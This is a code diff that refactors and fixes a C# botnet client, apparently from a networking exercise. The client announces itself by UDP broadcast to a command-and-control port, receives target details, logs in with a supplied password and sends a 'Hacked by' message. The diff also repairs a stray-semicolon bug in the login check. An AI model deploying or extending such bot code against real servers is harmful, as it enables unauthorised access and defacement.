@@ -11,36 +11,41 @@ namespace bot
 
     class BotServer
     {
-        private readonly string newline_delimeter = "\r\n";
-        Thread broadcast_thread;
-        private String hacked_message = "Hacked by ";
-        private int listening_port;
-        private int sending_port;
-        string brodcast = "255.255.255.255";
-        private int cc_port = 2019;
-        private static object sync_lock = new object();
-        private static object port_lock = new object();
+        private readonly string _newline_delimeter = "\r\n";
+        private Thread _broadcast_thread;
+        private String _hacked_message = "Hacked by ";
+        private int _listening_port;
+        private int _sending_port;
+        private int _cc_port;
+        private string _brodcast = "255.255.255.255";
+        private static object _sync_lock = new object();
+        private static object _port_lock = new object();
 
         public BotServer(int cc_port)
         {
 
-            lock (port_lock) {
-                UdpClient client_for_reciving = new UdpClient(0);
-                listening_port = ((IPEndPoint)client_for_reciving.Client.LocalEndPoint).Port;
-                client_for_reciving.Close();
-                UdpClient client_for_sending = new UdpClient(0);
-                sending_port = ((IPEndPoint)client_for_sending.Client.LocalEndPoint).Port;
-                client_for_sending.Close();
-                this.cc_port = cc_port;
+            lock (_port_lock) {
+                _listening_port = find_free_port();
+                _sending_port = find_free_port();
+                _cc_port = cc_port;
 
             }
 
         }
 
+        public int find_free_port()
+        {
+            UdpClient client_for_port = new UdpClient(0);
+            int port = ((IPEndPoint)client_for_port.Client.LocalEndPoint).Port;
+            client_for_port.Close();
+            return port;
+
+        }
+
         public void start()
         {
-            broadcast_thread = new Thread(new ThreadStart(activate_timer));
-            broadcast_thread.Start();
+            _broadcast_thread = new Thread(new ThreadStart(activate_timer));
+            _broadcast_thread.Start();
             listening_to_bot();
             int t = Console.Read();
         }
@@ -57,13 +62,13 @@ namespace bot
 
         public void bot_announcement(Object source, System.Timers.ElapsedEventArgs e)
         {
-            lock (sync_lock)
+            lock (_sync_lock)
             {
                 UdpClient client_udp = new UdpClient();
-                IPEndPoint ip = new IPEndPoint(IPAddress.Any, sending_port);
-                byte[] bytes = BitConverter.GetBytes((UInt16)listening_port);
+                IPEndPoint ip = new IPEndPoint(IPAddress.Any, _sending_port);
+                byte[] bytes = BitConverter.GetBytes((UInt16)_listening_port);
                 client_udp.Client.Bind(ip);
-                client_udp.Send(bytes, bytes.Length, brodcast, cc_port);
+                client_udp.Send(bytes, bytes.Length, _brodcast, _cc_port);
                 client_udp.Close();
             }
         }
@@ -75,7 +80,7 @@ namespace bot
             {
                 while (!done)
                 {
-                    UdpClient client = new UdpClient(listening_port);
+                    UdpClient client = new UdpClient(_listening_port);
                     IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
                     byte[] bytes = client.Receive(ref sender);
                     client.Close();
@@ -105,7 +110,7 @@ namespace bot
             }
             catch (SocketException e)
             {
-                Console.WriteLine("there was an error reciving port: " +listening_port + " sending port :" +sending_port );
+                Console.WriteLine("there was an error reciving port: " +_listening_port + " sending port :" +_sending_port );
             }
             finally
             {
@@ -119,7 +124,7 @@ namespace bot
             if (offset < readBytes - 1 && offset < rcv_buffer.Length - 1)
             {
                 byte[] maybe_delimeter = { rcv_buffer[offset], rcv_buffer[offset + 1] };
-                return Encoding.ASCII.GetString(maybe_delimeter).Equals(newline_delimeter);
+                return Encoding.ASCII.GetString(maybe_delimeter).Equals(_newline_delimeter);
             }
             else
             {
@@ -157,19 +162,22 @@ namespace bot
                     //Socket server = socket.Accept();
                     string response = receive(server, 100);
                     // check if the input is ok
-                    if (String.Equals(response, "Please enter your password", StringComparison.OrdinalIgnoreCase)) ;
-                    byte[] buffer = Encoding.ASCII.GetBytes(pass + "\r\n");
-                    server.Send(buffer, pass.Length + "\r\n".Length, SocketFlags.None);
-                    try {
-                        response = receive(server, 100);
-                        if (String.Equals(response, "Access granted", StringComparison.OrdinalIgnoreCase))
+                    if (String.Equals(response, "Please enter your password", StringComparison.OrdinalIgnoreCase)) {
+                        byte[] buffer = Encoding.ASCII.GetBytes(pass + _newline_delimeter);
+                        server.Send(buffer, pass.Length + _newline_delimeter.Length, SocketFlags.None);
+                        try
                         {
-                            String send_mssg = hacked_message + cnn_name + "\r\n";
-                            buffer = Encoding.ASCII.GetBytes(send_mssg);
-                            server.Send(buffer, send_mssg.Length, SocketFlags.None);
+                            response = receive(server, 100);
+                            if (String.Equals(response, "Access granted", StringComparison.OrdinalIgnoreCase))
+                            {
+                                String send_mssg = _hacked_message + cnn_name + _newline_delimeter;
+                                buffer = Encoding.ASCII.GetBytes(send_mssg);
+                                server.Send(buffer, send_mssg.Length, SocketFlags.None);
+                            }
                         }
+                        catch (Exception e) { }
                     }
-                    catch (Exception e) { }
+                    
                 }
                 catch(Exception e) { }
             
